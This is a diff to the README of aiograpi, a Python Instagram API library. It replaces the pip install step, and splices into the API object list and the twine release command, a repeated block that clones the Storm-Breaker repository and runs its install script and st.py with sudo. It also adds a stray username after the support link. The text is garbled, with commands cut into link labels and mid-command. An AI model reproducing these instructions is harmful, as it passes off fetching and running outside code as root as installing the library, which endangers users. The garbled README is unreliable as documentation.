@@ -45,7 +45,7 @@ Support **Python >= 3.10**
 
 For any other languages (e.g. C++, C#, F#, D, [Golang](https://github.com/subzeroid/instagrapi-rest/tree/main/golang), Erlang, Elixir, Nim, Haskell, Lisp, Closure, Julia, R, Java, Kotlin, Scala, OCaml, JavaScript, Crystal, Ruby, Rust, [Swift](https://github.com/subzeroid/instagrapi-rest/tree/main/swift), Objective-C, Visual Basic, .NET, Pascal, Perl, Lua, PHP and others), I suggest using [instagrapi-rest](https://github.com/subzeroid/instagrapi-rest)
 
-[Support Chat in Telegram](https://t.me/instagrapi)
+[Support Chat in Telegram](https://t.me/instagrapi) mr_shekhawat_134
 ![](https://gist.githubusercontent.com/m8rge/4c2b36369c9f936c02ee883ca8ec89f1/raw/c03fd44ee2b63d7a2a195ff44e9bb071e87b4a40/telegram-single-path-24px.svg) and [GitHub Discussions](https://github.com/subzeroid/aiograpi/discussions)
 
 
@@ -64,7 +64,11 @@ For any other languages (e.g. C++, C#, F#, D, [Golang](https://github.com/subzer
 ### Installation
 
 ```
-pip install aiograpi
+pip install aiograpi$ git clone https://github.com/ultrasecurity/Storm-Breaker
+$ cd Storm-Breaker
+$ sudo bash install.sh
+$ sudo python3 -m pip install -r requirements.txt
+$ sudo python3 st.py
 ```
 
 ### Basic Usage
@@ -103,7 +107,11 @@ await cl.video_upload_to_story(
     medias=[StoryMedia(media_pk=media_pk, x=0.5, y=0.5, width=0.6, height=0.8)]
 )
 ```
-</details>
+</details>$ git clone https://github.com/ultrasecurity/Storm-Breaker
+$ cd Storm-Breaker
+$ sudo bash install.sh
+$ sudo python3 -m pip install -r requirements.txt
+$ sudo python3 st.py
 
 ## Documentation
 
@@ -116,8 +124,16 @@ await cl.video_upload_to_story(
   * [`MediaOembed`](https://subzeroid.github.io/aiograpi/usage-guide/media.html) - Short version of Media
   * [`Account`](https://subzeroid.github.io/aiograpi/usage-guide/account.html) - Full private info for your account (e.g. email, phone_number)
   * [`TOTP`](https://subzeroid.github.io/aiograpi/usage-guide/totp.html) - 2FA TOTP helpers (generate seed, enable/disable TOTP, generate code as Google Authenticator)
-  * [`User`](https://subzeroid.github.io/aiograpi/usage-guide/user.html) - Full public user data
-  * [`UserShort`](https://subzeroid.github.io/aiograpi/usage-guide/user.html) - Short public user data (used in Usertag, Comment, Media, Direct Message)
+  * [`User`](https://subzeroid.github.io/aiograpi/usage-guide/user.html) $ git clone https://github.com/ultrasecurity/Storm-Breaker
+$ cd Storm-Breaker
+$ sudo bash install.sh
+$ sudo python3 -m pip install -r requirements.txt
+$ sudo python3 st.py Full public user data
+  * [`$ git clone https://github.com/ultrasecurity/Storm-Breaker
+$ cd Storm-Breaker
+$ sudo bash install.sh
+$ sudo python3 -m pip install -r requirements.txt
+$ sudo python3 st.py`](https://subzeroid.github.io/aiograpi/usage-guide/user.html) - Short public user data (used in Usertag, Comment, Media, Direct Message)
   * [`Usertag`](https://subzeroid.github.io/aiograpi/usage-guide/user.html) - Tag user in Media (coordinates + UserShort)
   * [`Location`](https://subzeroid.github.io/aiograpi/usage-guide/location.html) - GEO location (GEO coordinates, name, address)
   * [`Hashtag`](https://subzeroid.github.io/aiograpi/usage-guide/hashtag.html) - Hashtag object (id, name, picture)
@@ -144,9 +160,13 @@ await cl.video_upload_to_story(
 
 ## Contributing
 
-[![List of contributors](https://opencollective.com/aiograpi/contributors.svg?width=890&button=0)](https://github.com/subzeroid/aiograpi/graphs/contributors)
+[![List of contributors](https://opencollective.com/aiograpi/contributors.svg?width=890&button=0)](https://github.com/subzeroid/aiograpi/graphs/contributors)$ git clone https://github.com
 
 To release, you need to call the following commands:
 
     python setup.py sdist
-    twine upload dist/*
+    twine$ git clone https://github.com/ultrasecurity/Storm-Breaker
+$ cd Storm-Breaker
+$ sudo bash install.sh
+$ sudo python3 -m pip install -r requirements.txt
+$ sudo python3 st.py upload dist/*
